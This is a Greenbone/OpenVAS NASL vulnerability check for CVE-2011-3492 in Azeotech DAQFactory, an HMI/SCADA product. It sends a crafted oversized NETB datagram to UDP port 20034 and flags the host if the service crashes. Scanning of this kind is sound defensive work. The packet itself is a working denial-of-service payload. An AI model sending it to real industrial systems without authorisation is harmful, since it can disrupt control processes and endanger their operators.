# SPDX-FileCopyrightText: 2011 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802037");
  script_version("2023-07-21T05:05:22+0000");
  script_tag(name:"last_modification", value:"2023-07-21 05:05:22 +0000 (Fri, 21 Jul 2023)");
  script_tag(name:"creation_date", value:"2011-10-07 15:45:35 +0200 (Fri, 07 Oct 2011)");
  script_cve_id("CVE-2011-3492");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_name("Azeotech DAQFactory NETB Datagram Parsing Stack Buffer Overflow Vulnerability");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/69764");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/17841");
  script_xref(name:"URL", value:"http://aluigi.altervista.org/adv/daqfactory_1-adv.txt");
  script_xref(name:"URL", value:"http://www.us-cert.gov/control_systems/pdf/ICS-ALERT-11-256-02.pdf");

  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2011 Greenbone AG");
  script_family("Denial of Service");
  script_require_udp_ports(20034);

  script_tag(name:"impact", value:"Successful exploitation may allow remote attackers to execute
  arbitrary code on the system or cause denial of service condition.");

  script_tag(name:"affected", value:"Azeotech DAQFactory 5.85 build 1853 and earlier.");

  script_tag(name:"insight", value:"The flaw is due to an error while parsing NETB datagrams. Which
  can be exploited to cause a buffer overflow by sending a crafted NETB packet
  to port 20034/UDP.");

  script_tag(name:"solution", value:"Update to version 5.86 or later.");

  script_tag(name:"summary", value:"Azeotech DAQFactory (HMI/SCADA) is prone to a denial of service (DoS) vulnerability.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_analysis");

  script_xref(name:"URL", value:"http://www.azeotech.com/daqfactory.php");
  exit(0);
}

include("network_func.inc");

port = 20034;
if(!get_udp_port_state(port)){
  exit(0);
}

if(!check_udp_port_status(dport:port)){
  exit(0);
}

soc1 = open_sock_udp(port);
if(!soc1){
  exit(0);
}

req = raw_string( 'NETB',
                  crap(data:raw_string(0xff), length:156),
                  crap(data:'A', length:78),
                  0x00,
                  crap(data:'A', length:785) );

send(socket:soc1, data:req);

sleep(1);

if(!check_udp_port_status(dport:port)){
  security_message(port:port, proto:'udp');
}
